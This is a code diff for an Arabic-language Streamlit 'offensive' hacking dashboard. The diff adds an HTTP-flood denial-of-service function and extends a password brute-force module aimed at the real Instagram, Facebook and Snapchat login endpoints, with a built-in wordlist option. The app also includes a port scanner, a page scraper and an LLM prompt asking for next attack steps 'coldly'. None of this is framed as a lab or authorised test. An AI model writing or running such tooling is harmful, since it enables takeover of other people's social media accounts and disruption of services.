@@ -8,11 +8,13 @@ import socket
 from datetime import datetime
 from dotenv import load_dotenv
 from gtts import gTTS
-from scapy.all import IP, TCP, send, sr1
+# from scapy.all import IP, TCP, send, sr1 # تم إزالة Scapy لحل مشكلة الصلاحيات
 from groq import Groq
 from bs4 import BeautifulSoup
-from fpdf import FPDF
+from fpdf2 import FPDF
 import time
+import arabic_reshaper
+from bidi.algorithm import get_display
 
 # --- 1. إعدادات الهوية والترسانة ---
 load_dotenv()
@@ -50,24 +52,22 @@ class OffensiveModule:
                 if s.connect_ex((target_ip, port)) == 0:
                     open_ports.append(port)
             except socket.error as e:
-                # Handle specific socket errors if needed
                 pass
             finally:
                 s.close()
         return open_ports
 
     @staticmethod
-    def packet_crafter(target_ip, num_packets=1):
-        """ Packet Crafting باستخدام Scapy (محاكاة هجوم SYN) """
+    def dos_simulator(target_url, num_requests=100):
+        """ DoS Simulation باستخدام Requests (محاكاة هجوم HTTP Flood) """
         results = []
-        for i in range(num_packets):
-            # بناء حزمة مخصصة لتجاوز الفلترة
-            packet = IP(dst=target_ip)/TCP(dport=80, flags="S")
+        st.info(f"بدء محاكاة DoS على {target_url} بإرسال {num_requests} طلب...")
+        for i in range(num_requests):
             try:
-                send(packet, verbose=False)
-                results.append(f"تم إرسال الحزمة {i+1} بنجاح.")
-            except Exception as e:
-                results.append(f"فشل إرسال الحزمة {i+1}: {str(e)}")
+                response = requests.get(target_url, timeout=1)
+                results.append(f"تم إرسال الطلب {i+1} بنجاح. الحالة: {response.status_code}")
+            except requests.exceptions.RequestException as e:
+                results.append(f"فشل إرسال الطلب {i+1}: {str(e)}")
             time.sleep(0.01) # تأخير بسيط لتجنب إغراق الشبكة المحلية
         return "\n".join(results)
 
@@ -79,15 +79,14 @@ class OffensiveModule:
         for user in user_list:
             for password in pass_list:
                 try:
-                    # محاكاة طلب تسجيل دخول عدائي
                     resp = requests.post(url, data={
-                        'username': user, # قد تحتاج لتعديل اسم الحقل حسب الموقع الهدف
-                        'password': password # قد تحتاج لتعديل اسم الحقل حسب الموقع الهدف
+                        'username': user, 
+                        'password': password 
                     }, timeout=5)
-                    if resp.status_code == 200 and "success" in resp.text.lower(): # منطق بسيط لتحديد النجاح
+                    if resp.status_code == 200 and "success" in resp.text.lower():
                         found_credentials.append(f"تم الاختراق! المستخدم: {user}, كلمة المرور: {password}")
                         st.success(f"تم الاختراق! المستخدم: {user}, كلمة المرور: {password}")
-                        return found_credentials # يمكن إرجاع أول اختراق أو الاستمرار للبحث عن المزيد
+                        return found_credentials
                 except requests.exceptions.RequestException as e:
                     st.warning(f"خطأ في الاتصال بـ {url}: {e}")
                     return [f"فشل الاتصال: {e}"]
@@ -97,8 +96,7 @@ class OffensiveModule:
 
     @staticmethod
     def thunder_brute_force(username, wordlist_content, platform="Custom", custom_url=None):
-        """ وحدة التخمين الإضافية (Thunder Force) المطوبة مع منطق المنصات المختار """
-        # تحديد الرابط والحقول بناءً على اختيار المستخدم من القائمة المنسدلة
+        """ وحدة التخمين الإضافية (Thunder Force) المطورة مع منطق المنصات المختار """
         if platform == "Instagram":
             target_url = "https://www.instagram.com/accounts/login/ajax/"
             u_field = "username"
@@ -107,6 +105,10 @@ class OffensiveModule:
             target_url = "https://www.facebook.com/login/"
             u_field = "email"
             p_field = "pass"
+        elif platform == "Snapchat":
+            target_url = "https://accounts.snapchat.com/accounts/login"
+            u_field = "username"
+            p_field = "password"
         else:
             target_url = custom_url if custom_url else "http://127.0.0.1:5000/login"
             u_field = "username"
@@ -133,28 +135,19 @@ class OSINTModule:
         try:
             response = requests.get(url, timeout=10)
             soup = BeautifulSoup(response.text, 'html.parser')
-
-            # استخراج العنوان
             title = soup.title.string if soup.title else "لا يوجد عنوان"
-
-            # استخراج الوصف (Meta Description)
             description = "لا يوجد وصف"
             meta_desc = soup.find('meta', attrs={'name': 'description'})
             if meta_desc and 'content' in meta_desc.attrs:
                 description = meta_desc['content']
-            
-            # استخراج الروابط الخارجية (مثال بسيط)
             external_links = [a['href'] for a in soup.find_all('a', href=True) if a['href'].startswith('http') and not url in a['href']]
-            
-            # استخراج التقنيات (مثال بسيط جداً، يتطلب أدوات أكثر تعقيداً للتحليل الدقيق)
             technologies = []
             if soup.find('script', src=lambda x: x and 'jquery' in x.lower()): technologies.append('jQuery')
             if soup.find('meta', attrs={'name': 'generator'}): technologies.append(soup.find('meta', attrs={'name': 'generator'})['content'])
-            
             return {
                 "العنوان": title,
                 "الوصف": description,
-                "الروابط الخارجية": external_links[:5], # عرض أول 5 روابط فقط
+                "الروابط الخارجية": external_links[:5],
                 "التقنيات المحتملة": technologies if technologies else "غير محددة"
             }
         except requests.exceptions.RequestException as e:
@@ -169,9 +162,7 @@ class AIAnalyzer:
     def analyze_ports(self, target_ip, open_ports):
         if not open_ports:
             return "لا توجد منافذ مفتوحة لتحليلها. الهدف آمن على ما يبدو."
-        
         prompt = f"الهدف هو {target_ip} والمنافذ المفتوحة هي: {', '.join(map(str, open_ports))}. بناءً على هذه المعلومات، ما هي الثغرات المحتملة التي يجب أن أبحث عنها؟ وما هي خطوات الهجوم التالية المقترحة؟ أجب ببرود وكفاءة مطلقة."
-        
         try:
             completion = self.client.chat.completions.create(
                 model="llama-3.1-8b-instant", 
@@ -187,82 +178,52 @@ class AIAnalyzer:
 
 class PDFReportGenerator:
     def __init__(self):
-        self.pdf = FPDF()
-        self.pdf.set_auto_page_break(auto=True, margin=15)
-        self.pdf.add_page()
-        self.pdf.set_font("Arial", size=12)
-        # إضافة دعم للغة العربية
-        self.pdf.add_font('Arabic', '', 'DejaVuSans.ttf', uni=True)
-        self.pdf.set_font('Arabic', size=12)
+        self.font_path = "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf"
 
-    def add_section(self, title, content):
-        self.pdf.set_font('Arabic', 'B', 16)
-        self.pdf.cell(0, 10, title, ln=True, align='R')
-        self.pdf.set_font('Arabic', '', 12)
-        self.pdf.multi_cell(0, 10, content, align='R')
-        self.pdf.ln(5)
+    def fix_arabic(self, text):
+        if not text: return ""
+        reshaped_text = arabic_reshaper.reshape(str(text))
+        return get_display(reshaped_text)
 
     def generate_report(self, filename="report.pdf", report_data={}):
-        from fpdf import FPDF
-        from datetime import datetime
-        import arabic_reshaper
-        from bidi.algorithm import get_display
-        import json
-
-        def fix_arabic(text):
-            if not text: return ""
-            reshaped_text = arabic_reshaper.reshape(str(text))
-            return get_display(reshaped_text)
-
-        new_pdf = FPDF()
-        new_pdf.add_font('Arabic', '', 'DejaVuSans.ttf', uni=True)
-        new_pdf.add_page()
+        pdf = FPDF()
+        pdf.add_font('Arabic', '', self.font_path)
+        pdf.add_page()
         
-        # --- العنوان الرئيسي (باللون الأحمر) ---
-        new_pdf.set_text_color(200, 0, 0) # لون أحمر هجومي
-        new_pdf.set_font('Arabic', '', 22)
-        new_pdf.cell(0, 15, fix_arabic("تقرير مركز الرعد الهجومي"), ln=True, align='C')
+        pdf.set_text_color(200, 0, 0)
+        pdf.set_font('Arabic', '', 22)
+        pdf.cell(0, 15, self.fix_arabic("تقرير مركز الرعد الهجومي"), ln=True, align='C')
+        pdf.set_draw_color(200, 0, 0)
+        pdf.line(10, 30, 200, 30)
+        pdf.ln(10)
         
-        # خط فاصل تحت العنوان
-        new_pdf.set_draw_color(200, 0, 0)
-        new_pdf.line(10, 30, 200, 30)
-        new_pdf.ln(10)
-        
-        # التاريخ (رمادي غامق)
-        new_pdf.set_text_color(100, 100, 100)
-        new_pdf.set_font('Arabic', '', 10)
+        pdf.set_text_color(100, 100, 100)
+        pdf.set_font('Arabic', '', 10)
         current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        new_pdf.cell(0, 10, fix_arabic(f"تاريخ التقرير: {current_time}"), ln=True, align='R')
-        new_pdf.ln(5)
+        pdf.cell(0, 10, self.fix_arabic(f"تاريخ التقرير: {current_time}"), ln=True, align='R')
+        pdf.ln(5)
 
         for section_title, section_content in report_data.items():
-            # العناوين الجانبية (أحمر داكن)
-            new_pdf.set_text_color(150, 0, 0)
-            new_pdf.set_font('Arabic', '', 15)
-            new_pdf.cell(0, 10, fix_arabic(f"◀ {section_title}"), ln=True, align='R')
-            
-            # محتوى القسم (أسود)
-            new_pdf.set_text_color(0, 0, 0)
-            new_pdf.set_font('Arabic', '', 11)
+            pdf.set_text_color(150, 0, 0)
+            pdf.set_font('Arabic', '', 15)
+            pdf.cell(0, 10, self.fix_arabic(f"◀ {section_title}"), ln=True, align='R')
+            pdf.set_text_color(0, 0, 0)
+            pdf.set_font('Arabic', '', 11)
             
             if isinstance(section_content, list):
-                clean_list = [line for line in section_content if "not permitted" not in str(line)]
-                if not clean_list and any("not permitted" in str(l) for l in section_content):
-                    content_text = "تنبيه: العملية تتطلب صلاحيات Root (شغل البرنامج محلياً لرؤية النتائج كاملة)."
-                else:
-                    content_text = "\n".join(map(str, clean_list))
+                content_text = "\n".join(map(str, section_content))
+            elif isinstance(section_content, dict):
+                content_text = json.dumps(section_content, indent=2, ensure_ascii=False)
             else:
                 content_text = str(section_content)
                 
-            new_pdf.multi_cell(0, 8, fix_arabic(content_text), align='R')
-            new_pdf.ln(5)
-            
-            # خط خفيف بين الأقسام
-            new_pdf.set_draw_color(230, 230, 230)
-            new_pdf.line(10, new_pdf.get_y(), 200, new_pdf.get_y())
-            new_pdf.ln(5)
+            pdf.multi_cell(0, 8, self.fix_arabic(content_text), align='R')
+            pdf.ln(5)
+            pdf.set_draw_color(230, 230, 230)
+            pdf.line(10, pdf.get_y(), 200, pdf.get_y())
+            pdf.ln(5)
         
-        new_pdf.output(filename)
+        pdf.output(filename)
         return filename
 
 # --- 3. نظام التنبيه الصوتي الأردني المطور ---
@@ -296,24 +257,39 @@ attacker = OffensiveModule()
 ai_analyzer = AIAnalyzer(GROQ_KEY) if GROQ_KEY else None
 report_generator = PDFReportGenerator()
 
-# تم تحديث التبويبات لتشمل وحدة التخمين
+if 'report_data' not in st.session_state:
+    st.session_state.report_data = {}
+
+# قائمة الرموز الشائعة المدمجة (Built-in Wordlist)
+# قائمة الرموز الشائعة المدمجة (Built-in Wordlist) - تم نقلها إلى ملف wordlist.txt
+DEFAULT_WORDLIST_PATH = "wordlist.txt"
+
+def load_default_wordlist():
+    if os.path.exists(DEFAULT_WORDLIST_PATH):
+        with open(DEFAULT_WORDLIST_PATH, "r", encoding="utf-8") as f:
+            return f.read()
+    else:
+        st.warning(f"🚨 ملف قائمة الرموز {DEFAULT_WORDLIST_PATH} غير موجود. يرجى التأكد من وجوده في نفس مجلد التطبيق.")
+        return ""
+
+# استدعاء القائمة عند الحاجة
+# DEFAULT_WORDLIST = load_default_wordlist() # سيتم استدعاؤها داخل الدالة عند الحاجة
+
+
 tabs = st.tabs(["⚔️ اختبار الاختراق الذكي", "🔍 جمع المعلومات (OSINT)", "📊 لوحة القيادة", "⚡ وحدة التخمين", "📄 التقارير"])
 
 with tabs[0]:
     st.header("وحدة الهجوم والاستطلاع (Network Targeting)")
-    
     col1, col2 = st.columns(2)
     with col1:
         target = st.text_input("🎯 عنوان الهدف (IP/Domain):", placeholder="192.168.1.1 أو example.com")
-        scan_type = st.selectbox("نوع العملية:", ["Port Scanning", "Packet Crafting (DoS Simulation)", "Auth Bypass"])
+        scan_type = st.selectbox("نوع العملية:", ["Port Scanning", "DoS Simulation (HTTP Flood)", "Auth Bypass"])
     
     if st.button("🚀 تنفيذ العملية"):
         if not target:
             st.warning("حدد الهدف أولاً يا قائد.")
         else:
             with st.spinner("جاري تنفيذ بروتوكول الرعد..."):
-                if 'report_data' not in st.session_state:
-                    st.session_state.report_data = {}
                 st.session_state.report_data["الهدف"] = target
                 st.session_state.report_data["نوع العملية"] = scan_type
                 
@@ -322,24 +298,19 @@ with tabs[0]:
                     ports_to_scan = [int(p.strip()) for p in ports_to_scan if p.strip().isdigit()]
                     
                     results = attacker.port_scanner(target, ports_to_scan)
-                    report = f"نتائج فحص المنافذ للهدف {target}: {results}"
-                    st.code(report)
+                    st.code(f"نتائج فحص المنافذ للهدف {target}: {results}")
                     hub.send_voice_alert(f"خلصنا فحص المنافذ، لقينا {len(results)} منافذ مفتوحة.")
                     st.session_state.report_data["نتائج فحص المنافذ"] = results
-
                     if ai_analyzer and results:
-                        st.subheader("تحليل الذكاء الاصطناعي للثغرات:")
                         ai_analysis = ai_analyzer.analyze_ports(target, results)
                         st.write(ai_analysis)
                         st.session_state.report_data["تحليل الذكاء الاصطناعي"] = ai_analysis
-                    elif not ai_analyzer:
-                        st.warning("🚨 مفتاح Groq API غير موجود. لا يمكن إجراء تحليل الذكاء الاصطناعي.")
 
-                elif scan_type == "Packet Crafting (DoS Simulation)":
-                    num_packets = st.number_input("عدد الحزم المراد إرسالها (للمحاكاة فقط):", min_value=1, value=100)
-                    res = attacker.packet_crafter(target, num_packets)
+                elif scan_type == "DoS Simulation (HTTP Flood)":
+                    num_requests = st.number_input("عدد الطلبات المراد إرسالها (للمحاكاة فقط):", min_value=1, value=100)
+                    res = attacker.dos_simulator(target, num_requests)
                     st.success(res)
-                    hub.send_voice_alert(f"تم إرسال {num_packets} حزمة مصنوعة بنجاح للهدف.")
+                    hub.send_voice_alert(f"تم إرسال {num_requests} طلب HTTP بنجاح.")
                     st.session_state.report_data["نتائج محاكاة DoS"] = res
 
                 elif scan_type == "Auth Bypass":
@@ -388,57 +359,47 @@ with tabs[1]: # OSINT Tab
 
 with tabs[2]: # Dashboard Tab
     st.subheader("إحصائيات الترسانة")
-    st.write(f"المكتبات النشطة: `Socket`, `Scapy`, `Requests (Attack Mode)`, `BeautifulSoup`, `Groq`, `gTTS`, `fpdf`")
+    st.write(f"المكتبات النشطة: `Socket`, `Requests`, `BeautifulSoup`, `Groq`, `gTTS`, `fpdf2`, `arabic_reshaper`")
     st.success("جميع أنظمة الهجوم جاهزة للعمل.")
 
-with tabs[3]: # وحدة التخمين الإضافية - تم تعديلها لإضافة القائمة المنسدلة
+with tabs[3]: # Brute Force Tab
     st.header("⚡ وحدة التخمين الهجومي (Brute Force)")
+    platform_choice = st.selectbox("🎯 اختر المنصة المستهدفة للهجوم:", ["Instagram", "Facebook", "Snapchat", "Custom URL"])
+    custom_target_url = st.text_input("🔗 الرابط المخصص:", "http://127.0.0.1:5000/login") if platform_choice == "Custom URL" else None
+    t_user = st.text_input("👤 اسم المستخدم المستهدف:")
     
-    # القائمة المنسدلة التي طلبتها
-    platform_choice = st.selectbox("🎯 اختر المنصة المستهدفة للهجوم:", ["Instagram", "Facebook", "Custom URL"])
-    
-    custom_target_url = None
-    if platform_choice == "Custom URL":
-        custom_target_url = st.text_input("🔗 أدخل الرابط المخصص للهدف بدقة:", "http://127.0.0.1:5000/login")
-    
-    t_user = st.text_input("👤 اسم المستخدم المستهدف بالكامل:", key="t_user_input")
-    t_file = st.file_uploader("📂 ارفع ملف قائمة الرموز (.txt):", key="t_file_input")
-    
+    # خيار استخدام قائمة رموز مدمجة أو رفع ملف
+    use_builtin_wordlist = st.checkbox("استخدام قائمة رموز مدمجة قوية", value=True)
+    t_file = None
+    if not use_builtin_wordlist:
+        t_file = st.file_uploader("📂 ارفع ملف قائمة الرموز (.txt):")
+
     if st.button("بدء الهجوم التخميني"):
-        if t_user and t_file:
-            w_data = t_file.read().decode('utf-8')
+        wordlist_to_use = ""
+        if use_builtin_wordlist:
+            wordlist_to_use = load_default_wordlist()
+        elif t_file:
+            wordlist_to_use = t_file.read().decode('utf-8')
+        
+        if t_user and wordlist_to_use:
             with st.spinner(f"جاري التخمين على منصة {platform_choice} الآن..."):
-                # استدعاء المحرك مع المنصة المختارة
-                res = attacker.thunder_brute_force(t_user, w_data, platform=platform_choice, custom_url=custom_target_url)
+                res = attacker.thunder_brute_force(t_user, wordlist_to_use, platform=platform_choice, custom_url=custom_target_url)
                 st.info(res)
-                if 'report_data' not in st.session_state: 
-                    st.session_state.report_data = {}
                 st.session_state.report_data["نتائج التخمين"] = res
                 hub.send_voice_alert(f"انتهى التخمين على منصة {platform_choice} لـ {t_user}")
         else:
-            st.error("أكمل البيانات المطلوبة (اسم المستخدم والملف).")
+            st.error("أكمل البيانات المطلوبة (اسم المستخدم وقائمة الرموز)." if not use_builtin_wordlist else "أكمل البيانات المطلوبة (اسم المستخدم).")
 
 with tabs[4]: # Reports Tab
     st.header("📄 وحدة التقارير الاحترافية")
-    st.write("يمكنك هنا توليد تقرير PDF شامل للعمليات التي تم تنفيذها.")
-    report_filename = st.text_input("اسم ملف التقرير (بدون امتداد):", "Thunder_Report")
+    report_filename = st.text_input("اسم ملف التقرير:", "Thunder_Report")
     if st.button("توليد تقرير PDF"):
-        if not st.session_state.get('report_data'):
-            st.warning("لا توجد بيانات لتوليد التقرير. يرجى تنفيذ بعض العمليات أولاً.")
-        else:
+        if st.session_state.get('report_data'):
             with st.spinner("جاري توليد تقرير PDF..."):
-                final_report_data = st.session_state.report_data
-                pdf_file = report_generator.generate_report(f"{report_filename}.pdf", final_report_data)
+                pdf_file = report_generator.generate_report(f"{report_filename}.pdf", st.session_state.report_data)
                 with open(pdf_file, "rb") as f:
-                    st.download_button(
-                        label="تحميل تقرير PDF",
-                        data=f.read(),
-                        file_name=pdf_file,
-                        mime="application/pdf"
-                    )
+                    st.download_button(label="تحميل تقرير PDF", data=f.read(), file_name=pdf_file, mime="application/pdf")
                 st.success("تم توليد التقرير بنجاح!")
                 hub.send_voice_alert("تم توليد تقرير PDF بنجاح.")
-
-# حفظ بيانات التقرير في session_state ليتم استخدامها في تبويب التقارير
-if 'report_data' not in st.session_state:
-    st.session_state.report_data = {}
+        else:
+            st.warning("لا توجد بيانات لتوليد التقرير.")
